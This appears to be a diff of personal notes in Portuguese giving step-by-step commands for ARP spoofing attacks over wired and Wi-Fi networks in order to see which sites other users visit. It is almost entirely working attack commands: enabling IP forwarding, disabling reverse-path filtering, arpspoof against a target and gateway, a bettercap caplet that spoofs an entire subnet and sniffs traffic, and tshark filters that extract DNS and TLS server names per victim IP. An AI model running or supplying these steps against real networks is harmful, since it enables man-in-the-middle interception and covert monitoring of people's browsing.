@@ -1,11 +1,58 @@
+PARA FAZER ATAQUE DE ARP SPOOFING POR CABO PARA VER SITES QUE ESTÃO SENDO ACESSADOS:
+
+
+echo 1 | sudo tee /proc/sys/net/ipv4/ip_forward
+
+
+sudo arpspoof -i enp0s31f6 -t 192.168.1.5 192.168.1.1
+
+
+sudo arpspoof -i enp0s31f6 -t 192.168.1.1 192.168.1.5
+
+
+sudo tshark -i enp0s31f6 -Y "tls.handshake.type == 1 && tls.handshake.extensions_server_name" -T fields -e tls.handshake.extensions_server_name
+
+
+ATAQUE ARP SPOOFING POR WIFI PARA VER DNS DO IP:
+
+
 sudo sysctl -w net.ipv4.ip_forward=1
 
-sudo arpspoof -i wlan0 -t 192.168.1.1 192.168.1.5
+sudo sysctl -w net.ipv4.conf.all.rp_filter=0
+sudo sysctl -w net.ipv4.conf.wlan0.rp_filter=0
 
-sudo arpspoof -i wlan0 -t 192.168.1.5 192.168.1.1
+nano ~/ataque_rede.cap
 
-sudo tshark -i wlan0 -Y "dns or tls.handshake.extensions_server_name"
+==========================================================================================
+# Define a interface de rede
+set net.iface wlan0
 
-						OU
+# Define o alvo: Toda a sub-rede exceto você e o gateway
+set arp.spoof.targets 192.168.1.0/24
 
-sudo tshark -i wlan0 -Y "dns or tls.handshake.extensions_server_name" > captura.txt						
+# Ataca em full-duplex: Você finge ser o gateway para o alvo E o alvo para o gateway
+set arp.spoof.fullduplex true
+
+# Opcional: Ignora erros de DNS para não poluir o log
+set events.ignore udp.dns
+
+# INÍCIO DA EXECUÇÃO
+
+net.probe on
+
+
+sleep 5
+
+
+arp.spoof on
+
+
+sniffer.on
+
+====================================================================================
+
+
+sudo bettercap --caplet ~/ataque_rede.cap
+
+sudo tshark -i wlan0 -Y "tls.handshake.type == 1 && tls.handshake.extensions_server_name" -T fields -e ip.src -e tls.handshake.extensions_server_name -E separator=" -> "
+
